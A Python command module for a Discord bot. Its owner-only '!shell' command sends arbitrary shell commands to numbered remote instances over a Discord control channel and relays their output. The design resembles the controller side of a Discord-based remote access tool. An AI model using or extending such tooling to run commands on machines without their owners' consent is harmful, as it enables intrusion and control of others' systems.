"""
shell.py - !shell <number> <command>
Sends a shell command to a remote instance via the control channel.
"""
import asyncio
import uuid
import discord

OWNER_ID = 981259484691325018
CONTROL_CHANNEL_ID = 1508336791311089874
TIMEOUT = 35

async def run(client, message, args):
    if message.author.id != OWNER_ID:
        await message.channel.send("Unauthorized.", delete_after=5)
        return
    parts = args.strip().split(maxsplit=1)
    if len(parts) < 2:
        await message.channel.send("Usage: `!shell <number> <command>`")
        return
    try:
        num = int(parts[0])
    except ValueError:
        await message.channel.send("Number must be an integer.")
        return
    cmd = parts[1]

    instance_map = getattr(client, "_instance_map", {})
    full_id = instance_map.get(num)
    if not full_id:
        await message.channel.send("Run `!list` first to refresh the instance list.")
        return

    channel = client.get_channel(CONTROL_CHANNEL_ID)
    if not channel:
        await message.channel.send("Control channel not accessible.")
        return

    req_id = str(uuid.uuid4())[:8]
    full_cmd = f"{cmd} #req:{req_id}"
    await channel.send(f"!shell@{full_id} {full_cmd}")

    def check(m):
        return (m.author.id == client.user.id and
                m.channel.id == CONTROL_CHANNEL_ID and
                f"request {req_id}" in m.content)
    try:
        reply = await client.wait_for("message", timeout=TIMEOUT, check=check)
        await message.channel.send(f"Result from instance {full_id[:8]}:\n{reply.content}")
    except asyncio.TimeoutError:
        await message.channel.send("No response from instance (timeout).")
